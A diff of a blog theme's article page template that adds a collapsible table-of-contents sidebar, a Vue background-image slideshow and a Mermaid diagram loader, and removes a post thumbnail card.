+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
       </div>
-      <div class="post-img">
-        <a href="/2023/07/05/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload lazyload placeholder" src="/medias/img16.jpg" class="lazyload placeholder" data-srcset="/medias/img16.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-        </a>
+      <div class="toc-content">
+        <div class="toc"></div>
       </div>
-    </article>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
   
-</section>
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
 </div>
 
-<div class="w-70">
-  
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
 </div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
 
       </main>
     </div>
